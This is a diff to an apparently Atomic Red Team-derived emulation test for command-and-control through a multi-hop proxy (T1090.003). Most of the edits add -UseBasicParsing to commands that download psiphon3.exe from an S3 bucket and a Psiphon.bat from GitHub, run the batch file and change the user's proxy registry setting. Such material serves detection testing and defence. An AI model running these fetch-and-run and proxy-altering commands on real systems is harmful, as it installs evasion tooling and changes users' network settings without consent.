@@ -27,11 +27,12 @@
           $env:Temp\proxy-backup.txt $Proxy}; fi; if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\psiphon3.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest "https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\psiphon3.exe"; fi; if
-          (Test-Path "PathToAtomicsFolder\T1090.003\src\Psiphon.bat") {exit 0} else
-          {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1090.003\src\"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\psiphon3.exe" -UseBasicParsing;
+          fi; if (Test-Path "PathToAtomicsFolder\T1090.003\src\Psiphon.bat") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1090.003\src\"
           -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat"
-          -OutFile "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"; fi; & "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"'
+          -OutFile "PathToAtomicsFolder\T1090.003\src\Psiphon.bat" -UseBasicParsing;
+          fi; & "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"'
         cleanup: $Proxy = Get-Content $env:Temp\proxy-backup.txt -ErrorAction Ignore;
           if($null -ne $Proxy); {Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
           Settings' -Name "ProxyServer" -Value $Proxy}
@@ -41,9 +42,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1090.003
-  - command-and-control
   - atomic-red-team
+  - command-and-control
+  - t1090.003
   author: Atomic Red Team
   additional_info:
     dependencies:
@@ -71,7 +72,8 @@
         '
       get_prereq_command: "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\
         \" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe\"\
-        \ -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe\" \n"
+        \ -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe\" -UseBasicParsing\
+        \ \n"
     - description: "Batch file containing commands to run must be in src directory\
         \ \n"
       prereq_command: 'if (Test-Path "PathToAtomicsFolder\T1090.003\src\Psiphon.bat")
@@ -82,9 +84,9 @@
         -ErrorAction ignore -Force | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat"
-        -OutFile "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"
+        -OutFile "PathToAtomicsFolder\T1090.003\src\Psiphon.bat" -UseBasicParsing
 
         '
     technique_created: '2020-03-14T23:23:41.770Z'
     atomic_guid: 14d55ca0-920e-4b44-8425-37eedd72b173
-    import_timestamp: '2026-10-20T07:08:29.170393Z'
+    import_timestamp: '2026-10-21T07:01:51.232525Z'
